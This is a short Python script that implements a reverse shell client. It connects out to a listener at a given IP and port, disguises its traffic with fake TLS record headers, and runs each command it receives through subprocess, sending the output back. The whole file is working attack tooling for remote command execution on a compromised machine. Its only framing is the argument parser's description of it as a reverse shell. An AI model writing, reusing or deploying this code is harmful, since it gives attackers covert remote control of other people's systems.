import socket
import argparse
import subprocess

def encodePacket(data):
    """
    TODO: test
    """
    tlsHeader = bytes([0x17,0x03,0x01])
    length = len(data)
    toSend = tlsHeader + length.to_bytes(2, 'big') + data
    return toSend

def recievePacket(sock):
    """
    TODO: test
    """
    data = bytearray() 
    headIn = sock.recv(5)
    lenfromhead = int.from_bytes(headIn[3:], "big")
    return sock.recv(lenfromhead)


def run(ip, port):
    """TODO:
    """

    print("Attempting connection...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, int(port)))
    except:
        print("CONNECTION ERROR")
        exit(0)
    print("CONNECTED")
    #Send any data to initiallize connection. 
    sock.send(encodePacket("hello".encode()))

    while True:
        commandIn = recievePacket(sock).decode("utf-8").split()
        if commandIn[0] == "exit":
            print("EXITING...")
            sock.close()
            exit(0)
        toSend = bytearray()
        try:
            toSend = subprocess.check_output(commandIn)
        except:
            toSend = "COMMAND FAILED".encode()
        finally:
            sock.send(encodePacket(toSend))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start a reverse shell to connect to listiner.',
                                 usage="\n"
                                       "%(prog)s [IP] [PORT]"
                                       "\nUse '%(prog)s -h' for more information.")
    parser.add_argument('ip', help="IP to connect to.")
    parser.add_argument('port', help="Port to connect to.")
    args = parser.parse_args()
    run(args.ip, args.port)


